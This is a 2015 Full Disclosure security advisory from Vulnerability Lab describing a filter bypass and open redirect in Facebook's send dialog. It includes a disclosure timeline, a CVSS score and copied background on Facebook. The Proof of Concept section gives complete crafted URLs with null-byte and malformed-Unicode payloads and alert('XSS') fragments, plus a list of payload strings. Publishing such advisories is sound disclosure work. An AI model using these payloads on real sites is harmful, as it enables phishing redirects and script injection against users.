
Date: Mon, 18 May 2015 10:42:18 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] Facebook #26 - Filter Bypass & Exception Handling Redirect Web
	Vulnerability

Document Title:
===============
Facebook #26 - Filter Bypass & Exception Handling Redirect Web Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1483

http://www.vulnerability-lab.com/get_content.php?id=1484

Video View: https://www.youtube.com/watch?v=I65zFWF-pMg


Release Date:
=============
2015-05-09


Vulnerability Laboratory ID (VL-ID):
====================================
1483


Common Vulnerability Scoring System:
====================================
5.1


Product & Service Introduction:
===============================
Facebook is an online social networking service, whose name stems from the colloquial name for the book given to students 
at the start of the academic year by some university administrations in the United States to help students get to know 
each other. It was founded in February 2004 by Mark Zuckerberg with his college roommates and fellow Harvard University 
students Eduardo Saverin, Andrew McCollum, Dustin Moskovitz and Chris Hughes. The website`s membership was initially limited 
by the founders to Harvard students, but was expanded to other colleges in the Boston area, the Ivy League, and Stanford University. 
It gradually added support for students at various other universities before opening to high school students, and eventually to anyone 
aged 13 and over. Facebook now allows any users who declare themselves to be at least 13 years old to become registered users of the site.

Users must register before using the site, after which they may create a personal profile, add other users as friends, and exchange messages, 
including automatic notifications when they update their profile. Additionally, users may join common-interest user groups, organized by workplace, 
school or college, or other characteristics, and categorize their friends into lists such as `People From Work` or `Close Friends`. As of 
September 2012, Facebook has over one billion active users, of which 8.7% are fake. According to a May 2011 Consumer Reports survey, there are 
7.5 million children under 13 with accounts and 5 million under 10, violating the site`s terms of service.

In May 2005, Accel partners invested $12.7 million in Facebook, and Jim Breyer added $1 million of his own money to the pot. A January 2009 
Compete.com study ranked Facebook as the most used social networking service by worldwide monthly active users. Entertainment Weekly included the 
site on its end-of-the-decade `best-of` list, saying, `How on earth did we stalk our exes, remember our co-workers` birthdays, bug our friends, 
and play a rousing game of Scrabulous before Facebook?` Facebook eventually filed for an initial public offering on February 1, 2012, and was 
headquartered in Menlo Park, California. Facebook Inc. began selling stock to the public and trading on the NASDAQ on May 18, 2012. Based on its 
2012 income of USD 5.1 Billion, Facebook joined the Fortune 500 list for the first time, being placed at position of 462 on the list published in 2013.

(Copy of the Homepage: http://en.wikipedia.org/wiki/Facebook )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Core Research Team discovered a filter bypass and open redirect web vulnerability in the official Facebook online-service framework.


Vulnerability Disclosure Timeline:
==================================
2015-05-01: Researcher Notification & Coordination (Benjamin Kunz Mejri - Evolution Security GmbH)
2015-05-09: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Facebook
Product: Framework - Content Management System 2015 Q2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
High


Technical Details & Description:
================================
A filter validation issue is existant in the exception-handling that normally redirects to the original facebook source. 
Ever if an error comes up the website will show the context in the secure exception and redirects on okey click to the 
original valid source. In case of terminating the string (%00%00_%3F) with extended <_ it is possible to bypass the 
exception-handling filter exception to redirect invalid source to an external target. The video demonstrates how to 
bypass the filter validation by confusing the context copying with the non encoded url that invalid. By generating 
a payload that is ahead in the display value and atleast in the url ref the target exception redirect can be manipulated.


Proof of Concept (PoC):
=======================
https://www.facebook.com/dialog/send?app_id=102628213125203&display=F%00%2F%00%00%3C%uFFFD/%uFFFD%uFFFD%3C_popup&link=http%3A%2F%2Fwww.ebay.com%2Fcln%2F%00%2F%00%00%3C_&{alert%28%27XSS%27%29}%3B%3E%3%00%3C_&{alert%28%27XSS%27%29}%3B%3E%3Froken%3DcUgayN&description=%00%40eBayF%00%2F%00%00%3C%uFFFD/%uFFFD%uFFFD%3C_&redirect_uri=http%3A%2F%2F%EF%BF%BD/%EF%BF%BD%EF%BF%BD%3C%uFFFD/%uFFFD%uFFFD%3C_popup%2Fsoc%2Fshareclose&__mref=F%00%2F%00%00%3C%uFFFD/%uFFFD%uFFFD%3C_message_bubble


https://www.facebook.com/dialog/send?app_id=102628213125203&display=F%00%2F%00%00%3C%uFFFD/%uFFFD%uFFFD%3C_popup&link=http%3A%2F%2Fwww.ebay.com%2Fcln%2F%00%2F%00%00%3C_&{alert%28%27XSS%27%29}%3B%3E%3%00%3C_&{alert%28%27XSS%27%29}%3B%3E%3Froken%3DcUgayN&description=%00%40eBayF%00%2F%00%00%3C%uFFFD/%uFFFD%uFFFD%3C_&redirect_uri=http%3A%2F%2F%EF%BF%BD/%EF%BF%BD%EF%BF%BD%3C%uFFFD/%uFFFD%uFFFD%3C_popup%2Fsoc%2Fshareclose&__mref=F%00%2F%00%00%3C%uFFFD/%uFFFD%uFFFD%3C_message_bubble


Payload: 
3A%2F%2F%EF%BF%BD/%EF%BF%BD%EF%BF%BD%3C%uFFFD/%uFFFD%uFFFD%3C_
F%00%2F%00%00%3C%uFFFD/%uFFFD%uFFFD%3C_message_bubble
F%00%2F%00%00%3C%uFFFD/%uFFFD%uFFFD%3C_message_bubble<_


PoC Video(s):
The video demonstrates how to evade the filter validation of the message context that is delivered by a url link. The researcher demonstrates how to bypass 
the basic encoding by preparing a valid exception with unauthorized redirect.


Security Risk:
==============
The security risk of the filter bypass and exception redirect web vulnerability is estimated as medium. (CVSS 5.1)
The same payload to evade the filter validation can be used to other sections and exceptions that redirect the ref with the same conditions.


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@...lution-sec.com) [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com
PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/